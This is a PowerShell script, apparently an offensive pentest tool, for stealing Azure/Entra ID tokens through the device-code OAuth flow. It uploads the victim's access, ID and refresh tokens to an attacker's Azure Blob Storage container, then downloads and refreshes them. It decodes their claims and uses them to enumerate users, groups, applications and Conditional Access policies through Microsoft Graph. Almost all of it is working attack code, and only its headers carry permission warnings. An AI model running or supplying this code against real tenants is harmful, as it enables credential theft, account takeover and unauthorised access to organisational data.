<#
    .SYNOPSIS
        Simulates the stealing of Azure tokens from a compromised machine.
    .DESCRIPTION
        This function uses the device code OAuth 2.0 flow to obtain a users OIDC, Access and refresh tokens.
        The output is stored in a JSON file, and then uploaded to an Azure Blob Storage container.
    .NOTES
        WARNING: This Function should only be used in environments where you have explicit permission
#>
function Invoke-StealAzureTokens {
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$ContainerUri,
        [Parameter(Mandatory = $true)]
        [string]$SasToken
    )

    begin {
        $Body = [System.Collections.Hashtable]::new()
        $Headers = [System.Collections.Hashtable]::new()
        $AuthSplat = [System.Collections.Specialized.OrderedDictionary]::new()
        $Body['client_id'] = [string]'1950a258-227b-4e31-a9cf-717495945fc2'
        $Body['resource'] = [string]'https://graph.microsoft.com'

        $Headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $AuthSplat['Headers'] = [hashtable]$Headers
        $AuthSplat['UseBasicParsing'] = [boolean]$true
        $AuthSplat['Uri'] = [string]'https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0'
        $AuthSplat['Method'] = [string]'POST'
        $AuthSplat['Body'] = [hashtable]$Body

    }
    process {
        $AuthResponse = Invoke-RestMethod @AuthSplat
        $AuthResponse.message
        $Body.Remove('resource')
        $AuthSplat['Uri'] = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0'
        $Body['grant_type'] = [string]'urn:ietf:params:oauth:grant-type:device_code'
        $Body['code'] = [string]$AuthResponse.device_code

        while ([string]::IsNullOrEmpty($TokenResponse.Access_Token)) {
            try {
                $TokenResponse = Invoke-RestMethod @AuthSplat
            }
            catch {
                Start-Sleep -Seconds 10
                $AuthResponse.message
            }
        }

        $TokenResponse | ConvertTo-Json | Out-File Azure_Tokens.json
        $TokenMetaData = Get-ChildItem -Filter 'Azure_Tokens.json'
        $BlobStorageImport = [System.Collections.Specialized.OrderedDictionary]::new()
        $BlobStorageHeaders = [System.Collections.Hashtable]::new()
        $BlobStorageHeaders['x-ms-blob-type'] = [string]'BlockBlob'
        $BlobStorageImport['Uri'] = [string]"$($ContainerUri)/$($TokenMetaData.Name)?$($SasToken)"
        $BlobStorageImport['Method'] = 'PUT'
        $BlobStorageImport['InFile'] = $TokenMetaData.Name
        $BlobStorageImport['Headers'] = $BlobStorageHeaders
        $BlobStorageImport['Verbose'] = [boolean]$true

        Invoke-RestMethod @BlobStorageImport
    }
    end {
        Remove-Item 'Azure_Tokens.json'
        $BlobStorageImport.Clear()
        $AuthSplat.Clear()
        $Body.Clear()
    }
}

Invoke-StealAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..

<#
    .SYNOPSIS
        Extract the Access Tokens from the Actors cloud storage to use them for purposes of privileged escalation
    .DESCRIPTION
        This function performs a GET request against the Actors Cloud Storage to visibly extract values from the JSON Metadata
    .NOTES
        WARNING: This Function should only be used in environments where you have explicit permission
#>

#Now let's make an API request to gather the hijacked JSON :)
function Get-StolenAzureTokens {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$ContainerUri,
        [Parameter(Mandatory = $true)]
        [string]$SasToken
    )

    $BlobStorageExtraction = [System.Collections.Specialized.OrderedDictionary]::new()
    $BlobStorageHeaders = [System.Collections.Hashtable]::new()
    $BlobStorageHeaders['x-ms-blob-type'] = [string]'BlockBlob'
    $BlobStorageExtraction['Uri'] = [string]"$($ContainerUri)/Azure_Tokens.json?$($SasToken)"
    $BlobStorageExtraction['Method'] = 'GET'
    $BlobStorageExtraction['Headers'] = $BlobStorageHeaders
    $BlobStorageExtraction['Verbose'] = [boolean]$true

    Invoke-RestMethod @BlobStorageExtraction

}

$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..

<#
    .SYNOPSIS
        Use the extracted refresh token to produce another Access token & ID Token 
    .DESCRIPTION
        This function uses the extracted refresh token to refresh the Access & ID Tokens before they expire. These tokens are short lived.
    .NOTES
        WARNING: This Function should only be used in environments where you have explicit permission
#>

#Now let's use the hijacked refresh token to get ANOTHER Access token before it expires.
function Update-StolenAzureTokens {
    [CmdletBinding()]
    param ()   

    $RefreshTokenSplat = [System.Collections.Specialized.OrderedDictionary]::new()
    $Headers = [System.Collections.Hashtable]::new()
    $Body = [System.Collections.Hashtable]::new()
    $Headers['Content-Type'] = [string]'application/x-www-form-urlencoded'
    $Body['client_id'] = [string]'1950a258-227b-4e31-a9cf-717495945fc2'
    $Body['scope'] = [string]'openid'
    $Body['grant_type'] = [string]'refresh_token'
    $Body['refresh_token'] = [string]$HiJackedTokens.refresh_token
    $Body['resource'] = [string]'https://graph.microsoft.com'
    $RefreshTokenSplat['Uri'] = [string]'https://login.microsoftonline.com/common/oauth2/token'
    $RefreshTokenSplat['Method'] = [string]'POST'
    $RefreshTokenSplat['Body'] = [hashtable]$Body
    $RefreshTokenSplat['Headers'] = [hashtable]$Headers

    return (Invoke-RestMethod @RefreshTokenSplat)
    
}
$HiJackedTokens = Update-StolenAzureTokens

#Now lets take a look at the ID & Access tokens base64 decoded JSON converted payload :)

$DecodedAuthN = [System.Text.Encoding]::UTF8.GetString(`
        [Convert]::FromBase64String($HiJackedTokens.id_token.Split('.')[1])) | ConvertFrom-Json

$DecodedAuthZ = [System.Text.Encoding]::UTF8.GetString(`
        [Convert]::FromBase64String($HiJackedTokens.access_token.Split('.')[1])) | ConvertFrom-Json

$IDTokenClaims = [PSCustomObject]@{
    IDTokenAudience = $DecodedAuthN.aud
    IDTokenExpiry   = [DateTime]::UnixEpoch.AddSeconds([string]$DecodedAuthN.exp.ToString())
    AuthMethod      = $DecodedAuthN.amr
    LastName        = $DecodedAuthN.family_name
    FirstName       = $DecodedAuthN.given_name
    IP              = $DecodedAuthN.ipaddr
    UPN             = $DecodedAuthN.upn
}

$AccessTokenClaims = [PSCustomObject]@{
    AuthZScopes       = $DecodedAuthZ.scp
    AccessTokenExpiry = [DateTime]::UnixEpoch.AddSeconds([string]$DecodedAuthZ.exp.ToString())
    UPN               = $DecodedAuthZ.upn
    Audience          = $DecodedAuthZ.aud
    Issuer            = $DecodedAuthZ.iss
  
}

return $AccessTokenClaims, $IDTokenClaims


#Import and Install my Authored Module from PSGallery and then snake away. :)

if (([string]::IsNullOrEmpty((Get-InstalledModule -Name 'Graph' -ErrorAction SilentlyContinue)))) {
    Install-Module -Name 'Graph' -Force -AllowClobber #https://www.powershellgallery.com/packages/Graph
    Import-Module 'Graph'
}

$Entity = Read-Host "Would you like to Snake: Groups, Users, Policies Or Applications?"
while ($Entity -ne "Groups" -and $Entity -ne "Users" -and $Entity -ne "Applications" -and $Entity -ne "Policies") {
    Write-Warning "Invalid Input: Please enter Groups, Users or Applications"
    $Entity = Read-Host "Would you like to Snake: Groups, Users, Policies Or Applications?"
}

switch ($Entity) {
    "Groups" { $Entity = "Groups" }
    "Applications" { $Entity = "Applications" }
    "Users" { $Entity = "Users" }
    "Policies" { $Entity = "identity/conditionalAccess/policies" }
}
Invoke-GraphAPIRequest -GraphURL "https://graph.microsoft.com/Beta/$($Entity)" -Method 'GET' -AccessToken $HiJackedTokens.access_token
